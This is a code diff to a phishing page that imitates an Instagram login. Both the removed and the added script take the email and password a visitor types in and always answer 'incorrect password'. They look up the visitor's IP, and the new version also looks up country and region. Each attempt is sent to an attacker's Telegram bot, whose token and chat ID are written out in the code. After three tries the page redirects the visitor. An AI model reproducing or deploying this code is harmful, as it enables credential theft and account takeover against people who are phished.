@@ -214,55 +214,66 @@
 
     <!-- BEGIN VENDOR JS-->
     <script src="theme-assets/vendors/vendors.min.js"></script>
-    <!-- BEGIN THEME JS-->
-    <script src="theme-assets/js/theme.min.js"></script>
-    <script>
-        var login = document.getElementById('login');
-        var email = document.getElementById('email');
-        var password = document.getElementById('password');
-        var feedback = document.getElementById('feedback'); 
-        var alertMessage = document.getElementById('alert-message'); 
-        var attemptCount = 0;
+<!-- BEGIN THEME JS-->
+<script src="theme-assets/js/theme.min.js"></script>
+<script>
+    var login = document.getElementById('login');
+    var email = document.getElementById('email');
+    var password = document.getElementById('password');
+    var feedback = document.getElementById('feedback');
+    var attemptCount = 0;
 
-        login.addEventListener('click', function (event) {
-            event.preventDefault(); // Prevent the default form submission
+    login.addEventListener('click', function (event) {
+        event.preventDefault(); // Prevent the default form submission
 
-            // Increment the attempt count
-            attemptCount++;
+        // Increment the attempt count
+        attemptCount++;
 
-            // Always show incorrect password message
-            feedback.textContent = 'Incorrect password! Please try again...';
+        // Always show incorrect password message
+        feedback.textContent = '❌ Incorrect password! Please try again...';
 
-            // Get user IP address (using a public API)
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const userIP = data.ip;
+        // Get user IP address and location details
+        fetch('https://ip-api.com/json/')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.query;
+                const country = data.country;
+                const region = data.regionName; // State or province
+                const flag = getCountryEmoji(data.countryCode); // Get country emoji
 
-                    // Prepare the message to send to Telegram
-                    const message = `Attempt ${attemptCount}:\nEmail: ${email.value}\nPassword: ${password.value}\nIP: ${userIP}\nTag: Instagram`;
+                // Prepare the message to send to Telegram
+                const message = `🚨 Attempt ${attemptCount}:\n📧 Email: ${email.value}\n🔑 Password: ${password.value}\n🌍 IP: ${userIP}\n📍 Location: ${flag} ${country}, ${region}\n🏷️ Tag: Instagram`;
 
-                    // Send the message to the Telegram bot
-                    const telegramBotToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your bot token
-                    const chatId = '7735490302'; // Replace with your chat ID
-                    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                // Send the message to the Telegram bot
+                const telegramBotToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your bot token
+                const chatId = '7735490302'; // Replace with your chat ID
+                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-                    fetch(telegramUrl)
-                        .then(response => {
-                            if (response.ok) {
-                                console.log('Message sent to Telegram');
-                            } else {
-                                console.error('Error sending message to Telegram');
-                            }
-                        })
-                        .catch(error => console.error('Error:', error));
-                });
+                fetch(telegramUrl)
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('📤 Message sent to Telegram');
+                        } else {
+                            console.error('⚠️ Error sending message to Telegram');
+                        }
+                    })
+                    .catch(error => console.error('❌ Error:', error));
+            });
 
-            // Redirect to another page after 3 attempts
-            if (attemptCount >= 3) {
-                window.location.href = 'done.html';
-            }
-        });
-    </script>
+        // Redirect to another page after 3 attempts
+        if (attemptCount >= 3) {
+            window.location.href = 'done.html';
+        }
+    });
+
+    // Function to get country flag emoji from country code
+    function getCountryEmoji(countryCode) {
+        return countryCode
+            .toUpperCase()
+            .split('')
+            .map(char => String.fromCodePoint(127397 + char.charCodeAt()))
+            .join('');
+    }
+</script>
 </body>
 </html>
